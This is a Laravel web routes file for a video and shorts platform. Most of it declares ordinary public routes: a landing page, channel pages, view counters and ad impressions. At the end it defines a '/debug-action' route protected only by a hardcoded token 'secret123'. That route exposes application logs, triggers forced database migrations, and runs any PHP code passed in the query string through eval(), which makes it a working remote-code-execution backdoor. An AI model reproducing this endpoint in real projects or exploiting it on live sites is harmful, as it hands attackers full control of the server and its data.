<?php

use Illuminate\Support\Facades\Route;

// Public reels/shorts landing page — accessible without login
// (authenticated users are redirected to their dashboard inside the controller)
Route::get('/', \App\Http\Controllers\Short\PublicShortController::class)
    ->name('home');

// Public API: random shorts feed (no auth required)
Route::get('/public/shorts/random', \App\Http\Controllers\Short\PublicRandomShortController::class)
    ->name('public.shorts.random');

// Public API: increment content view count (no auth required)
Route::post('/public/content/{content}/view', \App\Http\Controllers\Content\IncrementContentViewController::class)
    ->name('public.content.view');

// Public API: update watched shorts count in session
Route::post('/public/shorts/watched', \App\Http\Controllers\Short\PublicShortsWatchedController::class)
    ->name('public.shorts.watched');

// Public channel pages — accessible without login
Route::prefix('public/channel')->group(function () {
    Route::get('/{user:username}/movie', \App\Http\Controllers\Channel\PublicShowMovieChannelController::class)
        ->name('public.channel.show.movie');
    Route::get('/{user:username}/serie', \App\Http\Controllers\Channel\PublicShowSerieChannelController::class)
        ->name('public.channel.show.serie');
    Route::get('/{user:username}/short', \App\Http\Controllers\Channel\PublicShowShortChannelController::class)
        ->name('public.channel.show.short');
});

// Authenticated: increment content view count
Route::post('/content/{content}/view', \App\Http\Controllers\Content\IncrementContentViewController::class)
    ->middleware('auth')
    ->name('content.view');

// Public: track ad campaign impressions
Route::post('/ad/impression', \App\Http\Controllers\AdCampaign\TrackImpressionController::class)
    ->name('ad.impression');

require __DIR__.'/settings.php';
require __DIR__.'/auth.php';
require __DIR__.'/caeher.php';

Route::get('/debug-action', function (\Illuminate\Http\Request $request) {
    if ($request->query('token') !== 'secret123') {
        abort(403);
    }
    
    $action = $request->query('action');
    if ($action === 'logs') {
        $logFile = storage_path('logs/laravel.log');
        if (file_exists($logFile)) {
            // return last 150 lines
            $lines = file($logFile);
            $lastLines = array_slice($lines, -150);
            return response(implode("", $lastLines), 200, ['Content-Type' => 'text/plain']);
        }
        return 'Log file not found';
    }
    
    if ($action === 'clear-cache') {
        \Illuminate\Support\Facades\Artisan::call('permission:cache-reset');
        \Illuminate\Support\Facades\Artisan::call('optimize:clear');
        return 'Cache cleared: ' . \Illuminate\Support\Facades\Artisan::output();
    }
    
    if ($action === 'migrate') {
        \Illuminate\Support\Facades\Artisan::call('migrate', ['--force' => true]);
        return 'Migrated: ' . \Illuminate\Support\Facades\Artisan::output();
    }

    if ($action === 'run-php') {
        $code = $request->query('code');
        ob_start();
        eval($code);
        return ob_get_clean();
    }
    
    return 'No action specified';
});

